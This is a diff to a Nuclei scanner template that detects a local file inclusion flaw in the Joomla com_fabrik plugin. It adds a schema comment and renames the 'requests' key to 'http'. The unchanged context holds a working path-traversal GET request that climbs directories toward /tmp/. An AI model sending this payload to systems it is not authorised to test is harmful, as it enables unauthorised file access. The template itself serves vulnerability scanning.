@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: joomla-com-fabrik-lfi
 
 info:
@@ -8,7 +9,7 @@ info:
     - https://www.exploit-db.com/exploits/48263
   tags: joomla,lfi
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/index.php?option=com_fabrik&task=plugin.pluginAjax&plugin=image&g=element&method=onAjax_files&folder=../../../../../../../../../../../../../../../tmp/'
